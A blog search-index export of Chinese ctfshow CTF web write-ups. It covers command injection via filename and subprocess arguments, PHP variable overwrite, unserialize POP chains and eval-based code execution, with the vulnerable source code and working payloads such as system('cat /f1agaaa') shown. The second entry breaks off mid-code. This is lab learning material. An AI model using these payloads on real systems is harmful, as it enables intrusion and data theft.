<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>ctfshow刷题</title>
      <link href="/posts/7acd7e04.html"/>
      <url>/posts/7acd7e04.html</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><p>来源：ctfshow</p><h4 id="easyPytHon-P"><a href="#easyPytHon-P" class="headerlink" title="easyPytHon_P"></a>easyPytHon_P</h4><blockquote><p>考点：代码审计，源代码查看</p><p>打开后查看源码，发现一个源码地址，打开看看</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109150901508.png" alt="image-20241109150901508"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109150915342.png" alt="image-20241109150915342"></p><blockquote><p>可以知道在此目录下有个flag.txt文件，再观察源码</p></blockquote><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask import request</span><br><span class="line">cmd: str = request.form.<span class="built_in">get</span>(<span class="string">&#x27;cmd&#x27;</span>)</span><br><span class="line">param: str = request.form.<span class="built_in">get</span>(<span class="string">&#x27;param&#x27;</span>)</span><br><span class="line"><span class="comment"># ------------------------------------- Don&#x27;t modify ↑ them ↑! But you can write your code ↓</span></span><br><span class="line">import subprocess, os</span><br><span class="line"><span class="keyword">if</span> cmd is <span class="keyword">not</span> None <span class="keyword">and</span> param is <span class="keyword">not</span> None:</span><br><span class="line">    try:</span><br><span class="line">        tVar = subprocess.<span class="built_in">run</span>([cmd[:3], param, __file__], <span class="attribute">cwd</span>=os.getcwd(), <span class="attribute">timeout</span>=5)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Done!&#x27;</span>)</span><br><span class="line">    except subprocess.TimeoutExpired:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Timeout!&#x27;</span>)</span><br><span class="line">    except:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Error!&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;No Flag!&#x27;</span>)</span><br></pre></td></tr></table></figure><blockquote><p>发现传入两个参数cmd和param，会截取cmd的前三个字符当成命令run，param被当成参数。</p><p>所以直接构造cat flag.txt</p><p>payload:</p></blockquote><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cmd</span><span class="language-bash">=<span class="built_in">cat</span>&amp;param=flag.txt</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109150800375.png" alt="image-20241109150800375"></p><blockquote><p>ctfshow{7d9cfcf5-9314-4eb0-9240-d77a6ca6f29d}</p></blockquote><h4 id="遍地飘零"><a href="#遍地飘零" class="headerlink" title="遍地飘零"></a>遍地飘零</h4><blockquote><p>考点：$$值覆盖，$_GET全局变量和本地变量</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$zeros</span>=<span class="string">&quot;000000000000000000000000000000&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$flag</span>==<span class="string">&quot;000000000000000000000000000000&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;好多零&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;没有零，仔细看看输入有什么问题吧&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$_GET</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>分析代码可知，get传参的参数名会传给key，将key的值传给变量value。</p><p>然后进行变量值覆盖，将key的值当作变量名，将value的值也当作变量名，且赋值前者为后者。</p><p>例如：传递参数 ?get=aa，则$key=get,$value=$key=aa，</p><p>值覆盖时，<script type="math/tex">key=$get，</script>value=$aa</p><p>所以，目标是执行var_dump($flag)</p><p>构造payload:</p></blockquote><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">_GET</span>=flag</span><br></pre></td></tr></table></figure><blockquote><p>传进去时，$key=_GET,$value=flag，再进行值覆盖，就变成了</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_GET=$flag</span><br></pre></td></tr></table></figure><p>从而实现目标，得到flag</p><p>ctfshow{2fe8eb61-9f07-4713-a7f2-311a3e4786d3}</p></blockquote><h4 id="茶歇区"><a href="#茶歇区" class="headerlink" title="茶歇区"></a>茶歇区</h4><blockquote><p>考点：多次整数溢出</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109160125845.png" alt="image-20241109160125845"></p><blockquote><p>先查看源码，找不到相关函数和score等计分的变量，所以不能通过控制台改代码了。</p><p>看到全是整数，想到整数溢出。先输入99999999999999999999</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109160320364.png" alt="image-20241109160320364"></p><blockquote><p>9223372036854775807</p><p>999999999999999999</p><p>输入999999999999999999，不断重复，直到出现flag</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109160421972.png" alt="image-20241109160421972"></p><blockquote><p>ctfshow{b31d09fc-4022-49ca-ad7d-ea533f98cdc2}</p></blockquote><h4 id="小舔田？"><a href="#小舔田？" class="headerlink" title="小舔田？"></a>小舔田？</h4><blockquote><p>考点：序列化构造pop链</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Moon</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;月亮&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;我是&quot;</span>.<span class="variable language_">$this</span>-&gt;name.<span class="string">&quot;快来赏我&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ion_Fan_Princess</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>=<span class="string">&quot;牛夫人&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">call</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;nickname==<span class="string">&quot;小甜甜&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;以前陪我看月亮的时候，叫人家小甜甜！现在新人胜旧人，叫人家&quot;</span>.<span class="variable language_">$this</span>-&gt;nickname.<span class="string">&quot;。\n&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;你以为我这么辛苦来这里真的是为了这条臭牛吗?是为了你这个没良心的臭猴子啊!\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">call</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;\t\t\t\t\t\t\t\t\t\t----&quot;</span>.<span class="variable language_">$this</span>-&gt;nickname;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Ion_Fan_Princess</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>进行代码审计，发现是个序列化题，有</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__toString</span>()和<span class="built_in">__wakeup</span>()</span><br></pre></td></tr></table></figure><p>构造一条pop链：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">call</span><span class="params">()</span></span> &lt;- Ion_Fan_Princess:<span class="built_in">__toString</span>() &lt;- Moon:<span class="built_in">__wakeup</span>()</span><br></pre></td></tr></table></figure></blockquote><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Moon&#123;</span><br><span class="line">    public <span class="variable">$name</span>;</span><br><span class="line">    public <span class="keyword">function</span> __toString()&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$this-</span><span class="built_in">&gt;name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    public <span class="keyword">function</span> __wakeup()&#123;</span><br><span class="line">        echo <span class="string">&quot;我是&quot;</span>.<span class="variable">$this-</span><span class="built_in">&gt;name</span>.<span class="string">&quot;快来赏我&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Ion_Fan_Princess&#123;</span><br><span class="line">    public <span class="variable">$nickname</span>=<span class="string">&quot;小甜甜&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    public <span class="keyword">function</span> __toString()&#123;</span><br><span class="line">        <span class="variable">$this-</span>&gt;call();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;\t\t\t\t\t\t\t\t\t\t----&quot;</span>.<span class="variable">$this-</span>&gt;nickname;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = new Moon();</span><br><span class="line"><span class="variable">$a-</span><span class="built_in">&gt;name</span> = new Ion_Fan_Princess();</span><br><span class="line">echo urlencode(serialize(<span class="variable">$a</span>));</span><br><span class="line">?&gt;</span><br><span class="line">//O<span class="meta">%3A4</span><span class="meta">%3A</span><span class="meta">%22Moon</span><span class="meta">%22</span><span class="meta">%3A1</span><span class="meta">%3A</span><span class="meta">%7Bs</span><span class="meta">%3A4</span><span class="meta">%3A</span><span class="meta">%22name</span><span class="meta">%22</span><span class="meta">%3BO</span><span class="meta">%3A16</span><span class="meta">%3A</span><span class="meta">%22Ion_Fan_Princess</span><span class="meta">%22</span><span class="meta">%3A1</span><span class="meta">%3A</span><span class="meta">%7Bs</span><span class="meta">%3A8</span><span class="meta">%3A</span><span class="meta">%22nickname</span><span class="meta">%22</span><span class="meta">%3Bs</span><span class="meta">%3A9</span><span class="meta">%3A</span><span class="meta">%22</span><span class="meta">%E5</span><span class="meta">%B0</span><span class="meta">%8F</span><span class="meta">%E7</span><span class="meta">%94</span><span class="meta">%9C</span><span class="meta">%E7</span><span class="meta">%94</span><span class="meta">%9C</span><span class="meta">%22</span><span class="meta">%3B</span><span class="meta">%7D</span><span class="meta">%7D</span></span><br></pre></td></tr></table></figure><blockquote><p>ctfshow{ab725e26-0530-4535-8cb5-517419dccb8b}</p></blockquote><h4 id="LSB探姬"><a href="#LSB探姬" class="headerlink" title="LSB探姬"></a>LSB探姬</h4><blockquote><p>考点：文件名中的命令执行</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109165919952.png" alt="image-20241109165919952"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*-coding:utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"># File       : app.py</span></span><br><span class="line"><span class="string"># Time       ：2022/10/20 15:16</span></span><br><span class="line"><span class="string"># Author     ：g4_simon</span></span><br><span class="line"><span class="string"># version    ：python 3.9.7</span></span><br><span class="line"><span class="string"># Description：TSTEG-WEB</span></span><br><span class="line"><span class="string"># flag is in /app/flag.py</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="comment">#初始化全局变量</span></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():    </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;upload.html&#x27;</span>)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            f = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">            f.save(<span class="string">&#x27;upload/&#x27;</span>+f.filename)</span><br><span class="line">            cmd=<span class="string">&quot;python3 tsteg.py upload/&quot;</span>+f.filename</span><br><span class="line">            result=os.popen(cmd).read()</span><br><span class="line">            data=&#123;<span class="string">&quot;code&quot;</span>:<span class="number">0</span>,<span class="string">&quot;cmd&quot;</span>:cmd,<span class="string">&quot;result&quot;</span>:result,<span class="string">&quot;message&quot;</span>:<span class="string">&quot;file uploaded!&quot;</span>&#125;</span><br><span class="line">            <span class="keyword">return</span> jsonify(data)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            data=&#123;<span class="string">&quot;code&quot;</span>:<span class="number">1</span>,<span class="string">&quot;message&quot;</span>:<span class="string">&quot;file upload error!&quot;</span>&#125;</span><br><span class="line">            <span class="keyword">return</span> jsonify(data)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;upload.html&#x27;</span>)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/source&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_source</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;source.html&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>,debug=<span class="literal">False</span>)</span><br><span class="line">          </span><br></pre></td></tr></table></figure><blockquote><p>分析可知，执行cmd命令，所以进行命令执行漏洞利用，在filename后执行ls命令</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109170048538.png" alt="image-20241109170048538"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109170107042.png" alt="image-20241109170107042"></p><blockquote><p>看到有flag.py，执行命令cat flag.py</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109170155275.png" alt="image-20241109170155275"></p><blockquote><p>ctfshow{343152ec-5bd1-467a-9f6c-33d7d8d3cfc8}</p></blockquote><h4 id="Is-Not-Obfuscate"><a href="#Is-Not-Obfuscate" class="headerlink" title="Is_Not_Obfuscate"></a>Is_Not_Obfuscate</h4><blockquote><p>考点：</p><p>打开后查看源码，发现端倪</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109171950520.png" alt="image-20241109171950520"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109172008208.png" alt="image-20241109172008208"></p><blockquote><p>先查看/robots.txt</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109172038816.png" alt="image-20241109172038816"></p><blockquote><p>查看/lib.php?flag=1</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109172117578.png" alt="image-20241109172117578"></p><blockquote><p>将这段复制到框中，再根据提示修改前端</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109172202256.png" alt="image-20241109172202256"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109172300276.png" alt="image-20241109172300276"></p><blockquote><p>然后得到一串代码</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;lib.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_dir</span>(<span class="string">&#x27;./plugins/&#x27;</span>))&#123;</span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="string">&#x27;./plugins/&#x27;</span>, <span class="number">0777</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Test it and delete it ！！！</span></span><br><span class="line"><span class="comment">//测试执行加密后的插件代码</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>] === <span class="string">&#x27;test&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Anything is good?Please test it.&#x27;</span>;</span><br><span class="line">    @<span class="keyword">eval</span>(<span class="title function_ invoke__">decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;input&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;./plugins/&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>])&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;pull&#x27;</span>:</span><br><span class="line">            <span class="variable">$output</span> = @<span class="keyword">eval</span>(<span class="title function_ invoke__">decode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;./plugins/&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;input&#x27;</span>])));</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;pull success&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;push&#x27;</span>:</span><br><span class="line">            <span class="variable">$input</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;./plugins/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;output&#x27;</span>].<span class="string">&#x27;youyou&#x27;</span>), <span class="title function_ invoke__">encode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;output&#x27;</span>]));</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;push success&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><blockquote><p>看到了个eval函数，所以可以先利用push，再用pull执行命令。</p><p>首先，构造payload:</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action=push&amp;output=<span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="title function_ invoke__">system</span>(<span class="string">&quot;ls /&quot;</span>));<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>这个payload会经过file_put_contents()函数存储在目录下。然后用file_get_contents()函数在目录下读取。所以</p></blockquote><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">input</span>=md5($_GET[<span class="string">&#x27;output&#x27;</span>].<span class="string">&#x27;youyou&#x27;</span>)。</span><br><span class="line">payload:</span><br><span class="line">?<span class="attribute">action</span>=pull&amp;input=b4b23ad51ccba6f288833a4e25cb361b</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109235359796.png" alt="image-20241109235359796"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109235416731.png" alt="image-20241109235416731"></p><blockquote><p>看到有个f1agaaa的文件，用同样的方式进行读取.</p><p>payload:</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?action=push&amp;output=<span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /f1agaaa&quot;</span>));<span class="meta">?&gt;</span></span><br><span class="line">?action=pull&amp;input=ba53a5488a5dfda0aff1bb1ee5fcfaa2</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109235645962.png" alt="image-20241109235645962"></p><blockquote><p>ctfshow{876b2dd2-9785-4eb0-9a6d-7bf0a081bc5c}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow萌新web</title>
      <link href="/posts/72ad6da1.html"/>
      <url>/posts/72ad6da1.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>来源：ctfshow</p></blockquote><p>[TOC]</p><h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><blockquote><p>考点：inval()函数漏洞，sql注入</p></blockquote><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>ctf.show萌新计划web1<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span><span class="language-php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="language-php"><span class="comment"># 包含数据库连接文件</span></span></span><br><span class="line"><span class="language-php"><span class="keyword">include</span>(<span class="string">&quot;config.php&quot;</span>);</span></span><br><span class="line"><span class="language-php"><span class="comment"># 判断get提交的参数id是否存在</span></span></span><br><span class="line"><span class="language-php"><span 